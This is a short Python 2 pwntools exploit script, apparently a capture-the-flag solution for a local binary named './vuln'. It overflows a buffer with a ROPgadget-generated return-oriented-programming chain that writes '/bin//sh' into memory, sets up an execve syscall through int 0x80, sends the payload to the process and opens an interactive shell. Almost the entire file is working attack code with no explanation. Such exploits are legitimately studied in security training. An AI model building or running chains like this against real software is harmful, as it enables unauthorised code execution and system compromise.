#! /usr/bin/env python2

from pwn import *
from struct import pack

# Created with ROPgadget
def get_ropchain():
    o = ('a'*0x1c)
    o += pack('<I', 0x0806ee6b) # pop edx ; ret
    o += pack('<I', 0x080da060) # @ .data
    o += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
    o += '/bin'
    o += pack('<I', 0x080da060) # padding without overwrite edx
    o += pack('<I', 0x41414141) # padding
    o += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
    o += pack('<I', 0x0806ee6b) # pop edx ; ret
    o += pack('<I', 0x080da064) # @ .data + 4
    o += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
    o += '//sh'
    o += pack('<I', 0x080da064) # padding without overwrite edx
    o += pack('<I', 0x41414141) # padding
    o += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
    o += pack('<I', 0x0806ee6b) # pop edx ; ret
    o += pack('<I', 0x080da068) # @ .data + 8
    o += pack('<I', 0x08056420) # xor eax, eax ; ret
    o += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
    o += pack('<I', 0x080481c9) # pop ebx ; ret
    o += pack('<I', 0x080da060) # @ .data
    o += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
    o += pack('<I', 0x080da068) # @ .data + 8
    o += pack('<I', 0x080da060) # padding without overwrite ebx
    o += pack('<I', 0x0806ee6b) # pop edx ; ret
    o += pack('<I', 0x080da068) # @ .data + 8
    o += pack('<I', 0x08056420) # xor eax, eax ; ret
    o += pack('<I', 0x0807c2fa) # inc eax ; ret
    o += pack('<I', 0x0807c2fa) # inc eax ; ret
    o += pack('<I', 0x0807c2fa) # inc eax ; ret
    o += pack('<I', 0x0807c2fa) # inc eax ; ret
    o += pack('<I', 0x0807c2fa) # inc eax ; ret
    o += pack('<I', 0x0807c2fa) # inc eax ; ret
    o += pack('<I', 0x0807c2fa) # inc eax ; ret
    o += pack('<I', 0x0807c2fa) # inc eax ; ret
    o += pack('<I', 0x0807c2fa) # inc eax ; ret
    o += pack('<I', 0x0807c2fa) # inc eax ; ret
    o += pack('<I', 0x0807c2fa) # inc eax ; ret
    o += pack('<I', 0x08049563) # int 0x80



    return o

raw = get_ropchain().encode('hex')
finished = ""
for i in range(0, len(raw), 2):
    try:
        finished = finished + "\\x" + str(raw[i]) + str(raw[i+1])
    except:
        print("oof")

print(finished)

e = ELF('./vuln')
p = process(e.path)
p.sendline(get_ropchain())
p.interactive()